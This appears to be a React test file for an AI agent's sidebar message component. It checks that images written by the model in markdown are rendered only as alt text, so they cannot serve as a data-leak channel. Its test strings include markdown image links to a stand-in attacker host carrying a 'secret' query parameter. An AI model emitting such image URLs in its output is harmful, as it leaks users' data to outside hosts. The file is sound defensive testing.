import { cleanup, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it } from "vitest";
// No `vi.mock("react-markdown", ...)` here on purpose: AgentSidebarMessage.test.tsx
// stubs react-markdown to a passthrough, which would hide a regression in the
// image handling this file is here to lock down.
import { AgentSidebarAgentMessage } from "./AgentSidebarMessage";

afterEach(cleanup);

describe("AgentSidebarAgentMessage model-written images (data-leak channel)", () => {
  it("renders only the alt text for a model-written image, never an <img>", () => {
    const { container } = render(
      <AgentSidebarAgentMessage content="![x](https://evil.example/?q=secret)" />,
    );
    expect(screen.getByText("x")).toBeInTheDocument();
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("[src]")).toBeNull();
    expect(container.querySelector("[srcset]")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.example");
  });

  it("renders only the alt text for a reference-style image", () => {
    const { container } = render(
      <AgentSidebarAgentMessage content={"![x][r]\n\n[r]: https://evil.example/p.png"} />,
    );
    expect(screen.getByText("x")).toBeInTheDocument();
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.example");
  });

  it("keeps the link but drops the image when an image is inside a link", () => {
    const { container } = render(
      <AgentSidebarAgentMessage content="[![x](https://evil.example/p.png)](https://ok.example)" />,
    );
    const links = container.querySelectorAll("a");
    expect(links).toHaveLength(1);
    expect(links[0]).toHaveAttribute("href", "https://ok.example");
    expect(links[0]).toHaveTextContent("x");
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.example");
  });

  it("renders no element and no URL text for an image with empty alt", () => {
    const { container } = render(
      <AgentSidebarAgentMessage content="![](https://evil.example/p.png)" />,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.example");
  });

  it("drops http: and data: image URLs the same way", () => {
    const { container } = render(
      <AgentSidebarAgentMessage content="![a](http://evil.example/p.png) ![b](data:image/png;base64,AAAA)" />,
    );
    expect(container.textContent).toBe("a b");
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("[src]")).toBeNull();
  });

  it("leaves no <img> for a half-written image mid-stream", () => {
    const { container } = render(
      <AgentSidebarAgentMessage content="![x](https://evil.exam" streaming />,
    );
    expect(container.querySelector("img")).toBeNull();
  });

  it("drops a model-written image inside a segmented reply", () => {
    const { container } = render(
      <AgentSidebarAgentMessage
        content="Before.After."
        segments={[
          { type: "text", text: "Before." },
          {
            type: "tool",
            id: "t-1",
            tool: { moduleSlug: "analytics", tool: "summarize_views", status: "done" },
          },
          { type: "text", text: "![x](https://evil.example/?q=secret) After." },
        ]}
      />,
    );
    expect(screen.getByText("After.", { exact: false })).toBeInTheDocument();
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.example");
  });

  it("still renders a normal link with target and rel", () => {
    render(<AgentSidebarAgentMessage content="[docs](https://ok.example)" />);
    const link = screen.getByRole("link", { name: "docs" });
    expect(link).toHaveAttribute("href", "https://ok.example");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
  });

  // Regression locks for the existing markdown surface, run here (unmocked)
  // for extra confidence alongside the image cases above.
  it("still renders headings, bold, lists and code", () => {
    const { container } = render(
      <AgentSidebarAgentMessage content={"## Heading\n\n**bold** `code`\n\n- item"} />,
    );
    expect(screen.getByRole("heading", { level: 2 })).toHaveTextContent("Heading");
    expect(screen.getByText("bold").tagName).toBe("STRONG");
    expect(screen.getByText("code").tagName).toBe("CODE");
    expect(container.querySelector("ul > li")).toHaveTextContent("item");
  });
});
